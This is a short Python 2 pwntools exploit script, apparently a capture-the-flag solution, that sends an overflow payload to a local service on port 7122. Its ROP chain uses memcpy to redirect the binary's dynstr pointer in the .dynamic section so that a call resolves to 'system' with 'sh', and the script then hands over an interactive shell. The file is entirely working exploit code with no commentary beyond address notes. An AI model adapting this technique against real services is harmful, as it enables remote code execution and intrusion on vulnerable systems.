#!/usr/bin/env python2

from pwn import *
from IPython import embed

r = remote('127.0.0.1', 7122)

def delay():
	sleep(0.2)

buf = 0x080497a0
d = buf + 2048

dynamic = 0x08049670
# dynstr is the 8th entry
# each dynamic entry is 8 bytes (tag + value)
dynamic_dynstr = dynamic + 8*8

memcpy = 0x08048310
write = 0x08048330
pop3 = 0x08048519
pop2 = 0x0804851a
pop1 = 0x0804851b
plt0 = 0x080482f0


rop = flat(
	memcpy, pop3, dynamic_dynstr+4, d, 4,
	write, 0xcafebeef, d+12
)

data = flat(			# 0
	d+4-56,			# 4
	'system\x00\x00',	# 12
	'sh\x00',
)

raw_input('@')

r.send( ('A'*18 + p32(buf+1024+4)).ljust(1024) + 
	rop .ljust(1024) +
	data.ljust(1024)
)

r.interactive()
